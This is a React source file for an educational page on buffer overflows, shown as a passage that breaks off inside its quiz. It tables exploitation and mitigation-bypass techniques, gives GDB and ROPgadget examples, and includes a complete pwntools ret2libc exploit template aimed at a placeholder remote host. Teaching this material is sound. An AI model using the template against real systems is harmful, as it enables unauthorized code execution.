import React, { useEffect, useState } from "react";
import {
  Box,
  Typography,
  Paper,
  alpha,
  useTheme,
  useMediaQuery,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Grid,
  Card,
  CardContent,
  Chip,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Button,
  Drawer,
  Fab,
  IconButton,
  Tooltip,
  Divider,
  LinearProgress,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import MemoryIcon from "@mui/icons-material/Memory";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import WarningIcon from "@mui/icons-material/Warning";
import ShieldIcon from "@mui/icons-material/Shield";
import CodeIcon from "@mui/icons-material/Code";
import BuildIcon from "@mui/icons-material/Build";
import HistoryIcon from "@mui/icons-material/History";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import CancelIcon from "@mui/icons-material/Cancel";
import StorageIcon from "@mui/icons-material/Storage";
import ArrowRightIcon from "@mui/icons-material/ArrowRight";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import QuizIcon from "@mui/icons-material/Quiz";
import SchoolIcon from "@mui/icons-material/School";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";

// CodeBlock component for syntax highlighting
function CodeBlock({ children, title }: { children: string; title?: string }) {
  const theme = useTheme();
  return (
    <Box sx={{ my: 2 }}>
      {title && (
        <Typography variant="caption" sx={{ color: "text.secondary", mb: 0.5, display: "block" }}>
          {title}
        </Typography>
      )}
      <Paper
        sx={{
          p: 2,
          bgcolor: theme.palette.mode === "dark" ? "#1a1a2e" : "#f5f5f5",
          borderRadius: 2,
          overflow: "auto",
          border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
        }}
      >
        <pre style={{ margin: 0, fontSize: "0.85rem", fontFamily: "monospace", whiteSpace: "pre-wrap" }}>
          {children}
        </pre>
      </Paper>
    </Box>
  );
}

// ========== DATA ARRAYS ==========

// Types of buffer overflows
const overflowTypes = [
  {
    name: "Stack-Based Overflow",
    description: "Overwrites data on the call stack, targeting return addresses or local variables",
    severity: "Critical",
    example: "Overwriting function return pointer to redirect execution",
  },
  {
    name: "Heap-Based Overflow",
    description: "Corrupts dynamically allocated memory on the heap",
    severity: "High",
    example: "Overwriting heap metadata to gain arbitrary write",
  },
  {
    name: "Integer Overflow",
    description: "Arithmetic operations exceed data type limits, causing unexpected values",
    severity: "High",
    example: "Size calculation wraps around, leading to small allocation",
  },
  {
    name: "Format String",
    description: "User input interpreted as format specifier, enabling memory read/write",
    severity: "Critical",
    example: "printf(user_input) with %n to write to memory",
  },
  {
    name: "Off-by-One",
    description: "Writing one byte beyond buffer boundary, often corrupting adjacent data",
    severity: "Medium",
    example: "Loop iterating <= instead of <, overwriting null terminator",
  },
  {
    name: "Use-After-Free",
    description: "Accessing memory after it has been freed, leading to corruption",
    severity: "Critical",
    example: "Dangling pointer dereference after free()",
  },
];

// Vulnerable functions by language
const vulnerableFunctions = [
  { language: "C", function: "strcpy()", safe: "strncpy() / strlcpy()", risk: "No bounds checking" },
  { language: "C", function: "strcat()", safe: "strncat() / strlcat()", risk: "No bounds checking" },
  { language: "C", function: "sprintf()", safe: "snprintf()", risk: "No size limit" },
  { language: "C", function: "gets()", safe: "fgets()", risk: "No bounds, deprecated" },
  { language: "C", function: "scanf()", safe: "scanf with width", risk: "No bounds on %s" },
  { language: "C", function: "memcpy()", safe: "memcpy_s()", risk: "No overlap check" },
  { language: "C++", function: "std::copy()", safe: "std::copy_n()", risk: "Iterator bounds" },
];

// Memory protections
const memoryProtections = [
  {
    name: "Stack Canaries",
    description: "Random value placed before return address, checked before function returns",
    bypass: "Information leak to read canary value",
    compiler: "GCC: -fstack-protector",
  },
  {
    name: "ASLR",
    description: "Address Space Layout Randomization - randomizes memory addresses",
    bypass: "Brute force (32-bit) or information leak",
    compiler: "OS-level protection",
  },
  {
    name: "DEP/NX",
    description: "Data Execution Prevention - marks memory regions non-executable",
    bypass: "Return-Oriented Programming (ROP)",
    compiler: "GCC: -z noexecstack",
  },
  {
    name: "PIE",
    description: "Position Independent Executable - randomizes code section",
    bypass: "Information leak to calculate base address",
    compiler: "GCC: -pie -fPIE",
  },
  {
    name: "RELRO",
    description: "Relocation Read-Only - protects GOT from overwrites",
    bypass: "Partial RELRO: overwrite before relocation",
    compiler: "GCC: -Wl,-z,relro,-z,now",
  },
  {
    name: "CFI",
    description: "Control Flow Integrity - validates indirect call targets",
    bypass: "Find valid gadgets within allowed targets",
    compiler: "Clang: -fsanitize=cfi",
  },
];

// Exploitation techniques
const exploitationTechniques = [
  {
    name: "Return-to-libc",
    description: "Redirect execution to existing library functions like system()",
    useCase: "Bypass NX/DEP without shellcode",
  },
  {
    name: "ROP (Return-Oriented Programming)",
    description: "Chain small code snippets (gadgets) ending in ret instruction",
    useCase: "Bypass NX/DEP with arbitrary computation",
  },
  {
    name: "JOP (Jump-Oriented Programming)",
    description: "Similar to ROP but uses jump instructions instead of returns",
    useCase: "Bypass return-based CFI",
  },
  {
    name: "Heap Spraying",
    description: "Fill heap with NOP sleds and shellcode to increase hit probability",
    useCase: "Exploit heap-based overflows with unknown addresses",
  },
  {
    name: "Stack Pivoting",
    description: "Change stack pointer to attacker-controlled memory region",
    useCase: "When stack space is limited for ROP chain",
  },
  {
    name: "GOT Overwrite",
    description: "Overwrite Global Offset Table entries to hijack function calls",
    useCase: "Redirect library calls to malicious code",
  },
];

// Real-world CVEs
const realWorldCVEs = [
  {
    cve: "CVE-2021-44228",
    name: "Log4Shell",
    type: "Not traditional buffer overflow",
    impact: "Remote Code Execution",
    year: 2021,
  },
  {
    cve: "CVE-2014-0160",
    name: "Heartbleed",
    type: "Buffer over-read",
    impact: "Information Disclosure",
    year: 2014,
  },
  {
    cve: "CVE-2017-0144",
    name: "EternalBlue",
    type: "Pool overflow",
    impact: "Remote Code Execution",
    year: 2017,
  },
  {
    cve: "CVE-2019-0708",
    name: "BlueKeep",
    type: "Use-after-free",
    impact: "Remote Code Execution",
    year: 2019,
  },
  {
    cve: "CVE-2021-3156",
    name: "Baron Samedit",
    type: "Heap overflow in sudo",
    impact: "Privilege Escalation",
    year: 2021,
  },
];

// Analysis tools
const analysisTools = [
  { name: "GDB", category: "Debugger", description: "GNU Debugger for runtime analysis" },
  { name: "Ghidra", category: "Disassembler", description: "NSA's reverse engineering framework" },
  { name: "IDA Pro", category: "Disassembler", description: "Industry-standard disassembler" },
  { name: "pwntools", category: "Framework", description: "Python CTF/exploit development library" },
  { name: "ROPgadget", category: "ROP", description: "Find ROP gadgets in binaries" },
  { name: "checksec", category: "Analysis", description: "Check binary security properties" },
  { name: "Valgrind", category: "Analysis", description: "Memory error detector" },
  { name: "AddressSanitizer", category: "Sanitizer", description: "Fast memory error detector" },
];

// Advanced heap exploitation techniques
const heapExploitTechniques = [
  {
    name: "Fastbin Attack",
    description: "Corrupt fastbin free list to get arbitrary allocation",
    conditions: "Control over freed chunk's fd pointer, same-size allocation",
    example: "Double free -> allocate at GOT/hook -> overwrite with one_gadget",
  },
  {
    name: "Tcache Poisoning",
    description: "Corrupt tcache bin to achieve arbitrary write (glibc 2.26+)",
    conditions: "UAF or heap overflow on tcache chunk",
    example: "Overwrite tcache next pointer -> allocate at target -> write payload",
  },
  {
    name: "House of Force",
    description: "Overflow top chunk size to allocate anywhere in memory",
    conditions: "Overflow into top chunk, control allocation size",
    example: "Set top size to -1 -> request huge negative allocation -> wrap around to target",
  },
  {
    name: "House of Spirit",
    description: "Free a fake chunk to get it into freelist",
    conditions: "Control over memory that can look like valid chunk",
    example: "Craft fake chunk on stack -> free it -> allocate returns stack memory",
  },
  {
    name: "Unsorted Bin Attack",
    description: "Overwrite arbitrary location with main_arena address",
    conditions: "Control over unsorted chunk's bk pointer",
    example: "Modify bk -> write &unsorted_chunks to target during unlinking",
  },
  {
    name: "Large Bin Attack",
    description: "Write heap address to arbitrary location",
    conditions: "Control over large bin chunk's bk_nextsize",
    example: "Used to overwrite global_max_fast or other targets",
  },
];

// Windows-specific exploitation techniques
const windowsExploitTechniques = [
  {
    name: "SEH Overwrite",
    description: "Overwrite Structured Exception Handler to hijack control flow",
    mitigation: "SafeSEH, SEHOP",
    bypass: "Find non-SafeSEH module, or use SEHOP bypass techniques",
  },
  {
    name: "EggHunter",
    description: "Small shellcode that searches memory for larger payload",
    use: "When buffer is too small for full shellcode",
    size: "32-byte stub searches for 'egg' tag (e.g., W00T) in memory",
  },
  {
    name: "Unicode Exploitation",
    description: "Craft exploits that survive Unicode conversion",
    challenge: "Many bytes become invalid after UTF-16 encoding",
    technique: "Use venetian shellcode or Unicode-compatible gadgets",
  },
  {
    name: "Kernel Pool Overflow",
    description: "Overflow in kernel pool memory for privilege escalation",
    targets: "Pool metadata, TypeIndex, adjacent allocations",
    mitigation: "Kernel pool hardening, NonPagedPoolNx",
  },
];

// ARM-specific exploitation
const armExploitTechniques = [
  {
    name: "ARM ROP",
    description: "Return-oriented programming on ARM architecture",
    difference: "4-byte aligned instructions, LR instead of return address on stack",
    gadgets: "Look for 'pop {pc}', 'bx lr', 'blx r*' endings",
  },
  {
    name: "Thumb Mode",
    description: "16-bit instruction mode provides different gadget set",
    transition: "Switch with 'bx' instruction, LSB of address determines mode",
    advantage: "More compact gadgets, different instruction encoding",
  },
  {
    name: "ARM64 Exploitation",
    description: "64-bit ARM with different calling convention",
    registers: "x0-x7 for arguments, x30 (LR) for return address",
    challenges: "PAC (Pointer Authentication), BTI (Branch Target Identification)",
  },
];

// GDB debugging examples
const gdbExamples = [
  {
    title: "Finding Offset to Return Address",
    commands: `# Generate pattern
$ pattern_create 200
Aa0Aa1Aa2...

# Run program with pattern
$ gdb ./vulnerable
(gdb) run "Aa0Aa1Aa2..."
(gdb) info registers eip
eip 0x41366441

# Find offset
$ pattern_offset 0x41366441
[*] Offset: 76`,
  },
  {
    title: "Examining Stack Frame",
    commands: `(gdb) break vulnerable_function
(gdb) run "AAAA"
(gdb) x/20x $esp        # Examine stack
(gdb) x/s $ebp+8        # Return address location
(gdb) info frame        # Stack frame info
(gdb) backtrace         # Call stack`,
  },
  {
    title: "Finding Gadgets with ROPgadget",
    commands: `$ ROPgadget --binary ./vulnerable --only "pop|ret"
0x080484c1 : pop ebx ; ret
0x080484bf : pop ebp ; ret
0x08048482 : pop edi ; pop ebp ; ret

$ ROPgadget --binary ./vulnerable --ropchain`,
  },
  {
    title: "Examining Heap Chunks",
    commands: `(gdb) heap chunks          # pwndbg
(gdb) bins                  # Show all freelist bins
(gdb) vis_heap_chunks       # Visual heap layout
(gdb) p *(struct malloc_chunk *)0x602000`,
  },
];

// Detailed CVE case studies
const detailedCVEStudies = [
  {
    cve: "CVE-2021-3156 (Baron Samedit)",
    name: "Sudo Heap Overflow",
    discovery: "Qualys Research Team, January 2021",
    description: "Heap-based buffer overflow in sudo's sudoedit due to incorrect handling of backslash escapes",
    technical: "Parsing sudoedit command-line arguments with backslashes could write beyond allocated buffer",
    exploitation: "Craft input to overflow heap, corrupt adjacent chunk, achieve arbitrary write, overwrite service_user pointer",
    impact: "Local privilege escalation to root on most Linux distributions",
    patch: "sudo 1.9.5p2 - proper bounds checking in set_cmnd()",
  },
  {
    cve: "CVE-2014-0160 (Heartbleed)",
    name: "OpenSSL TLS Heartbeat",
    discovery: "Google Security / Codenomicon, April 2014",
    description: "Buffer over-read in OpenSSL's TLS heartbeat extension",
    technical: "Heartbeat request length field not validated against actual payload size",
    exploitation: "Request heartbeat with large length but small payload; server responds with memory contents",
    impact: "Remote reading of server memory including private keys, session tokens, passwords",
    patch: "OpenSSL 1.0.1g - validate payload length against buffer size",
  },
  {
    cve: "CVE-2017-0144 (EternalBlue)",
    name: "SMBv1 Pool Overflow",
    discovery: "NSA (leaked by Shadow Brokers), April 2017",
    description: "Pool buffer overflow in Windows SMBv1 handling of Transaction2 requests",
    technical: "Integer overflow leads to undersized pool allocation, followed by overflow during data copy",
    exploitation: "Carefully craft SMB packets to corrupt adjacent pool allocations, achieve code execution",
    impact: "Remote code execution, used in WannaCry and NotPetya ransomware",
    patch: "MS17-010 - proper size validation in srv.sys",
  },
];

// Complete pwntools exploit template
const pwntoolsTemplate = `#!/usr/bin/env python3
from pwn import *

# ===============================
# Configuration
# ===============================
context.update(
    arch='amd64',
    os='linux',
    log_level='info',
    terminal=['tmux', 'splitw', '-h']
)

BINARY = './vulnerable'
LIBC = './libc.so.6'  # Optional: for ret2libc

elf = ELF(BINARY)
libc = ELF(LIBC) if os.path.exists(LIBC) else None

# ===============================
# Helper Functions
# ===============================
def start(argv=[], *a, **kw):
    """Start local process or remote connection"""
    if args.REMOTE:
        return remote('target.com', 1337)
    elif args.GDB:
        return gdb.debug([BINARY] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([BINARY] + argv, *a, **kw)

gdbscript = '''
break main
continue
'''

# ===============================
# Exploit
# ===============================
def exploit():
    io = start()

    # Step 1: Leak address (if ASLR)
    io.recvuntil(b"Enter name: ")
    io.sendline(b"%p.%p.%p.%p.%p.%p")
    leak = io.recvline()
    libc_leak = int(leak.split(b'.')[5], 16)
    libc_base = libc_leak - libc.symbols['__libc_start_main'] - 240
    log.info(f"Libc base: {hex(libc_base)}")

    # Step 2: Build ROP chain
    rop = ROP(elf)

    if libc:
        # ret2libc
        system = libc_base + libc.symbols['system']
        binsh = libc_base + next(libc.search(b'/bin/sh'))

        # 64-bit: need to set rdi first
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret = rop.find_gadget(['ret'])[0]  # Stack alignment

        payload = flat([
            b'A' * 72,          # Offset to return address
            ret,                 # Stack alignment for movaps
            pop_rdi,
            binsh,
            system,
        ])
    else:
        # Simple return address overwrite
        payload = flat([
            b'A' * 72,
            elf.symbols['win'],  # Target function
        ])

    # Step 3: Send payload
    io.recvuntil(b"Enter data: ")
    io.sendline(payload)

    # Step 4: Profit
    io.interactive()

if __name__ == '__main__':
    exploit()
`;

// ASLR bypass techniques
const aslrBypassTechniques = [
  {
    technique: "Information Leak",
    description: "Read memory address from program output to calculate base addresses",
    methods: ["Format string to leak stack/libc pointers", "Use-after-free to leak heap metadata", "Partial overwrite (maintain high bytes)"],
  },
  {
    technique: "Brute Force (32-bit)",
    description: "On 32-bit systems, limited entropy makes brute forcing feasible",
    methods: ["Only ~12 bits of entropy on some systems", "Network services can be brute forced (256-65536 attempts)", "Child processes inherit parent's ASLR layout"],
  },
  {
    technique: "Return-to-PLT",
    description: "PLT/GOT entries have known offsets from binary base",
    methods: ["Binary may not be PIE (fixed base)", "Call PLT entries with controlled arguments", "Chain with GOT overwrite for full control"],
  },
  {
    technique: "Ret2dlresolve",
    description: "Abuse dynamic linker to resolve arbitrary function",
    methods: ["Craft fake Elf32_Rel structure", "Trigger _dl_runtime_resolve with fake symbol", "Works without any leaks if binary has enough gadgets"],
  },
];

// Prevention methods
const preventionMethods = [
  {
    method: "Use Safe Functions",
    description: "Replace unsafe functions with bounds-checked alternatives",
    priority: "Critical",
  },
  {
    method: "Input Validation",
    description: "Validate all input lengths before processing",
    priority: "Critical",
  },
  {
    method: "Compiler Protections",
    description: "Enable stack canaries, ASLR, PIE, RELRO, NX",
    priority: "High",
  },
  {
    method: "Memory-Safe Languages",
    description: "Use Rust, Go, or other memory-safe alternatives",
    priority: "High",
  },
  {
    method: "Static Analysis",
    description: "Use tools like Coverity, CodeQL to find vulnerabilities",
    priority: "High",
  },
  {
    method: "Fuzzing",
    description: "Automated testing to find crashes and memory errors",
    priority: "Medium",
  },
  {
    method: "Code Review",
    description: "Manual review focusing on memory operations",
    priority: "Medium",
  },
  {
    method: "Runtime Sanitizers",
    description: "Use ASan, MSan during development and testing",
    priority: "Medium",
  },
];

const QUIZ_QUESTION_COUNT = 10;
const QUIZ_ACCENT_COLOR = "#8b5cf6";
const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "A buffer overflow happens when:",
    options: [
      "More data is written than a buffer can hold",
      "A file is encrypted",
      "A user logs in",
      "A process forks",
    ],
    correctAnswer: 0,
    explanation: "Overflows occur when writes exceed buffer boundaries.",
  },
  {
    id: 2,
    topic: "Stack",
    question: "A stack-based overflow often targets:",
    options: ["The return address", "The disk cache", "The GPU driver", "The DNS resolver"],
    correctAnswer: 0,
    explanation: "Overwriting the return address can redirect execution.",
  },
  {
    id: 3,
    topic: "Heap",
    question: "A heap-based overflow typically corrupts:",
    options: ["Heap metadata or adjacent allocations", "Only CPU registers", "Kernel modules", "Stack canaries"],
    correctAnswer: 0,
    explanation: "Heap overflows corrupt heap chunks or metadata.",
  },
  {
    id: 4,
    topic: "Types",
    question: "An integer overflow can lead to:",
    options: ["Too-small allocations", "Perfect bounds checks", "Stronger ASLR", "Faster syscalls"],
    correctAnswer: 0,
    explanation: "Wrapped values can cause undersized buffers.",
  },
  {
    id: 5,
    topic: "Types",
    question: "An off-by-one bug writes:",
    options: ["One byte past the boundary", "Zero bytes", "A full page", "Only headers"],
    correctAnswer: 0,
    explanation: "Off-by-one errors exceed the buffer by one byte.",
  },
  {
    id: 6,
    topic: "Types",
    question: "A format string vulnerability occurs when:",
    options: ["User input is used as a format string", "Inputs are encrypted", "Only integers are parsed", "Logs are compressed"],
    correctAnswer: 0,
    explanation: "User-controlled format strings can read or write memory.",
  },
  {
    id: 7,
    topic: "Types",
    question: "A use-after-free happens when:",
    options: ["Memory is accessed after being freed", "A string is copied safely", "A buffer is cleared", "A pointer is set to null"],
    correctAnswer: 0,
    explanation: "Use-after-free accesses memory after it is released.",
  },
  {
    id: 8,
    topic: "Unsafe APIs",
    question: "Which C function is unsafe because it has no bounds checks?",
    options: ["strcpy()", "strncpy()", "snprintf()", "fgets()"],
    correctAnswer: 0,
    explanation: "strcpy does not check destination size.",
  },
  {
    id: 9,
    topic: "Unsafe APIs",
    question: "Which C function is deprecated and unsafe for input?",
    options: ["gets()", "fgets()", "read()", "scanf with width"],
    correctAnswer: 0,
    explanation: "gets is unsafe and removed from modern standards.",
  },
  {
    id: 10,
    topic: "Safe APIs",
    question: "Which function provides a size limit for formatting?",
    options: ["snprintf()", "sprintf()", "strcpy()", "strcat()"],
    correctAnswer: 0,
    explanation: "snprintf takes a maximum buffer size.",
  },
  {
    id: 11,
    topic: "Protections",
    question: "Stack canaries are designed to:",
    options: ["Detect stack smashing", "Increase heap size", "Disable ASLR", "Encrypt strings"],
    correctAnswer: 0,
    explanation: "Canaries detect stack corruption before returning.",
  },
  {
    id: 12,
    topic: "Protections",
    question: "ASLR works by:",
    options: ["Randomizing memory addresses", "Making all memory executable", "Disabling canaries", "Compressing binaries"],
    correctAnswer: 0,
    explanation: "ASLR randomizes memory layout to make exploitation harder.",
  },
  {
    id: 13,
    topic: "Protections",
    question: "NX/DEP prevents:",
    options: ["Executing code from data regions", "Heap allocations", "Symbol loading", "Stack growth"],
    correctAnswer: 0,
    explanation: "NX blocks execution from data pages like the stack.",
  },
  {
    id: 14,
    topic: "Protections",
    question: "PIE enables:",
    options: ["Randomized code addresses", "Fixed code addresses", "Disabled relocations", "Kernel-only execution"],
    correctAnswer: 0,
    explanation: "PIE makes the main binary relocatable for ASLR.",
  },
  {
    id: 15,
    topic: "Protections",
    question: "RELRO primarily protects the:",
    options: ["GOT", "Heap", "Stack", "Environment variables"],
    correctAnswer: 0,
    explanation: "RELRO hardens the Global Offset Table.",
  },
  {
    id: 16,
    topic: "Protections",
    question: "CFI stands for:",
    options: ["Control Flow Integrity", "Core File Inspection", "Compiler Flag Index", "Code Fragment Injection"],
    correctAnswer: 0,
    explanation: "CFI restricts illegal control-flow transfers.",
  },
  {
    id: 17,
    topic: "Exploitation",
    question: "Overwriting the return address allows:",
    options: ["Control of instruction flow", "Automatic patching", "Stronger validation", "Faster IO"],
    correctAnswer: 0,
    explanation: "Attackers redirect execution by overwriting the return address.",
  },
  {
    id: 18,
    topic: "Exploitation",
    question: "A NOP sled is used to:",
    options: ["Increase shellcode landing reliability", "Block syscalls", "Compress payloads", "Fix heap metadata"],
    correctAnswer: 0,
    explanation: "NOP sleds make it easier to jump into shellcode.",
  },
  {
    id: 19,
    topic: "Exploitation",
    question: "ret2libc typically uses:",
    options: ["Existing libc functions like system()", "Only kernel syscalls", "Only stack canaries", "Only shell scripts"],
    correctAnswer: 0,
    explanation: "ret2libc reuses libc code to bypass NX.",
  },
  {
    id: 20,
    topic: "Exploitation",
    question: "ROP chains are built from:",
    options: ["Short gadgets ending in ret", "Only inline assembly", "Only Java bytecode", "Only kernel modules"],
    correctAnswer: 0,
    explanation: "ROP uses gadgets already present in memory.",
  },
  {
    id: 21,
    topic: "Exploitation",
    question: "JOP uses:",
    options: ["Jump-oriented gadgets", "Only return instructions", "Only syscalls", "Only signal handlers"],
    correctAnswer: 0,
    explanation: "JOP chains gadgets connected by jumps.",
  },
  {
    id: 22,
    topic: "Exploitation",
    question: "Stack pivoting means:",
    options: ["Changing the stack pointer to attacker-controlled memory", "Encrypting the stack", "Deleting stack frames", "Randomizing the heap"],
    correctAnswer: 0,
    explanation: "Stack pivots move RSP to attacker-controlled data.",
  },
  {
    id: 23,
    topic: "Testing",
    question: "Fuzzing is used to:",
    options: ["Find crashes and memory errors", "Encrypt binaries", "Disable logs", "Remove mitigations"],
    correctAnswer: 0,
    explanation: "Fuzzers generate inputs to trigger bugs.",
  },
  {
    id: 24,
    topic: "Testing",
    question: "AddressSanitizer is used to:",
    options: ["Detect memory corruption", "Patch binaries", "Disable ASLR", "Compile kernels"],
    correctAnswer: 0,
    explanation: "ASan finds out-of-bounds and use-after-free bugs.",
  },
  {
    id: 25,
    topic: "Testing",
    question: "Valgrind helps detect:",
    options: ["Invalid memory access", "Network latency", "Disk partitions", "GPU drivers"],
    correctAnswer: 0,
    explanation: "Valgrind reports memory access errors.",
  },
  {
    id: 26,
    topic: "Stack",
    question: "A stack frame usually contains:",
    options: ["Local variables and return address", "Only heap metadata", "Only kernel state", "Only network buffers"],
    correctAnswer: 0,
    explanation: "Stack frames store locals and saved return info.",
  },
  {
    id: 27,
    topic: "Protections",
    question: "Which flag enables stack canaries in GCC?",
    options: ["-fstack-protector", "-fno-plt", "-Wl,-z,now", "-O0"],
    correctAnswer: 0,
    explanation: "GCC uses -fstack-protector for canaries.",
  },
  {
    id: 28,
    topic: "Protections",
    question: "Which macro enables glibc fortify checks?",
    options: ["-D_FORTIFY_SOURCE=2", "-fno-omit-frame-pointer", "-fno-stack-protector", "-z execstack"],
    correctAnswer: 0,
    explanation: "FORTIFY_SOURCE adds lightweight bounds checks.",
  },
  {
    id: 29,
    topic: "Protections",
    question: "Which linker option marks the stack non-executable?",
    options: ["-z noexecstack", "-z execstack", "-Wl,--strip-all", "-Wl,-z,norelro"],
    correctAnswer: 0,
    explanation: "-z noexecstack enables NX on the stack.",
  },
  {
    id: 30,
    topic: "Protections",
    question: "Which compiler flags enable PIE?",
    options: ["-fPIE -pie", "-fno-pie", "-static", "-Winvalid-pch"],
    correctAnswer: 0,
    explanation: "PIE is enabled with -fPIE -pie.",
  },
  {
    id: 31,
    topic: "Tools",
    question: "checksec is used to:",
    options: ["Report binary mitigations", "Encrypt files", "Generate payloads", "Edit symbols"],
    correctAnswer: 0,
    explanation: "checksec reports mitigations like NX and PIE.",
  },
  {
    id: 32,
    topic: "Signals",
    question: "A segmentation fault typically raises:",
    options: ["SIGSEGV", "SIGKILL", "SIGALRM", "SIGCHLD"],
    correctAnswer: 0,
    explanation: "SIGSEGV is raised on invalid memory access.",
  },
  {
    id: 33,
    topic: "Registers",
    question: "On x86, the instruction pointer register is:",
    options: ["EIP/RIP", "ESP", "EAX", "EBX"],
    correctAnswer: 0,
    explanation: "EIP/RIP holds the next instruction address.",
  },
  {
    id: 34,
    topic: "Exploitation",
    question: "Endianness matters because:",
    options: ["Addresses must be written in the correct byte order", "It disables ASLR", "It adds stack canaries", "It fixes overflows"],
    correctAnswer: 0,
    explanation: "Incorrect byte order breaks address overwrites.",
  },
  {
    id: 35,
    topic: "Exploitation",
    question: "On x86, a NOP instruction is:",
    options: ["0x90", "0xCC", "0xFF", "0x00"],
    correctAnswer: 0,
    explanation: "0x90 is the x86 NOP opcode.",
  },
  {
    id: 36,
    topic: "Heap",
    question: "Heap spraying is used to:",
    options: ["Increase the chance of landing on shellcode", "Clear the heap", "Disable ASLR", "Fix double frees"],
    correctAnswer: 0,
    explanation: "Spraying fills memory with predictable payloads.",
  },
  {
    id: 37,
    topic: "Exploitation",
    question: "A GOT overwrite can:",
    options: ["Redirect function calls", "Fix stack canaries", "Disable NX", "Patch binaries safely"],
    correctAnswer: 0,
    explanation: "Overwriting the GOT can hijack indirect calls.",
  },
  {
    id: 38,
    topic: "Protections",
    question: "The error 'stack smashing detected' indicates:",
    options: ["A canary check failed", "A kernel panic", "A successful exploit", "A log rotation event"],
    correctAnswer: 0,
    explanation: "A canary mismatch triggers a stack smashing error.",
  },
  {
    id: 39,
    topic: "Prevention",
    question: "A safer alternative to strcpy is:",
    options: ["strncpy()", "gets()", "sprintf()", "strcat()"],
    correctAnswer: 0,
    explanation: "strncpy provides a length limit.",
  },
  {
    id: 40,
    topic: "Prevention",
    question: "Input validation should include:",
    options: ["Checking lengths before copy", "Trusting user claims", "Removing logs", "Disabling canaries"],
    correctAnswer: 0,
    explanation: "Length checks prevent overflows.",
  },
  {
    id: 41,
    topic: "Testing",
    question: "ASan is enabled with:",
    options: ["-fsanitize=address", "-fno-plt", "-Wl,-z,now", "-static"],
    correctAnswer: 0,
    explanation: "Use -fsanitize=address for AddressSanitizer.",
  },
  {
    id: 42,
    topic: "Protections",
    question: "Bypassing canaries often requires:",
    options: ["An information leak", "Only a NOP sled", "A bigger buffer", "No changes"],
    correctAnswer: 0,
    explanation: "You must know the canary value to preserve it.",
  },
  {
    id: 43,
    topic: "Protections",
    question: "ASLR bypass commonly uses:",
    options: ["An info leak to reveal addresses", "Disabling logging", "A compiler warning", "A longer password"],
    correctAnswer: 0,
    explanation: "Leaked addresses defeat ASLR.",
  },
  {
    id: 44,
    topic: "Protections",
    question: "NX is typically bypassed with:",
    options: ["ROP or ret2libc", "Bigger buffers", "Shorter inputs", "Kernel updates only"],
    correctAnswer: 0,
    explanation: "ROP and ret2libc avoid executing injected code.",
  },
  {
    id: 45,
    topic: "Protections",
    question: "Full RELRO makes the GOT:",
    options: ["Read-only after relocation", "Always writable", "Removed entirely", "Mapped on the stack"],
    correctAnswer: 0,
    explanation: "Full RELRO prevents GOT overwrites at runtime.",
  },
  {
    id: 46,
    topic: "Protections",
    question: "Partial RELRO leaves the GOT:",
    options: ["Writable for lazy binding", "Read-only always", "Encrypted", "In kernel memory"],
    correctAnswer: 0,
    explanation: "Partial RELRO keeps GOT writable for lazy binding.",
  },
  {
    id: 47,
    topic: "Heap",
    question: "A double free means:",
    options: ["free() called twice on the same pointer", "Two allocations succeed", "Two stacks are created", "Two threads exit"],
    correctAnswer: 0,
    explanation: "Double free corrupts heap state.",
  },
  {
    id: 48,
    topic: "Heap",
    question: "Corrupting heap metadata can lead to:",
    options: ["Arbitrary write primitives", "Automatic patching", "Stronger ASLR", "More canaries"],
    correctAnswer: 0,
    explanation: "Heap metadata corruption can allow controlled writes.",
  },
  {
    id: 49,
    topic: "Heap",
    question: "malloc returns:",
    options: ["A pointer to heap memory", "A file descriptor", "A syscall number", "A stack frame"],
    correctAnswer: 0,
    explanation: "malloc returns a pointer to allocated heap space.",
  },
  {
    id: 50,
    topic: "Heap",
    question: "free() typically:",
    options: ["Does not zero memory", "Zeroes all memory", "Encrypts memory", "Moves memory to disk"],
    correctAnswer: 0,
    explanation: "free() usually leaves data intact.",
  },
  {
    id: 51,
    topic: "Stack",
    question: "Stack overflows often corrupt:",
    options: ["Saved return address or base pointer", "Only heap metadata", "Only registers", "Only disk buffers"],
    correctAnswer: 0,
    explanation: "Overflow data can overwrite saved control data.",
  },
  {
    id: 52,
    topic: "Types",
    question: "An off-by-one null byte can:",
    options: ["Alter adjacent metadata or pointers", "Fix all bugs", "Disable ASLR", "Remove canaries"],
    correctAnswer: 0,
    explanation: "A single byte can corrupt adjacent data.",
  },
  {
    id: 53,
    topic: "Types",
    question: "The %n format specifier can:",
    options: ["Write to memory", "Only print integers", "Encrypt strings", "Disable logging"],
    correctAnswer: 0,
    explanation: "%n writes the number of bytes printed.",
  },
  {
    id: 54,
    topic: "Prevention",
    question: "Memory-safe languages help by:",
    options: ["Preventing unsafe memory access", "Disabling ASLR", "Reducing logging", "Removing patching"],
    correctAnswer: 0,
    explanation: "Memory-safe languages enforce bounds checks and safety.",
  },
  {
    id: 55,
    topic: "Risk",
    question: "Overflows in SUID binaries can cause:",
    options: ["Privilege escalation", "Lower CPU usage", "Smaller binaries", "Stronger encryption"],
    correctAnswer: 0,
    explanation: "Exploiting SUID binaries can grant higher privileges.",
  },
  {
    id: 56,
    topic: "Debugging",
    question: "Core dumps are useful for:",
    options: ["Post-crash analysis", "Disabling ASLR", "Encrypting data", "Changing permissions"],
    correctAnswer: 0,
    explanation: "Core dumps capture process memory at crash time.",
  },
  {
    id: 57,
    topic: "Memory",
    question: "A typical process layout includes:",
    options: ["Stack, heap, shared libraries, code", "Only kernel memory", "Only GPU buffers", "Only network sockets"],
    correctAnswer: 0,
    explanation: "Processes map code, data, heap, stack, and shared libs.",
  },
  {
    id: 58,
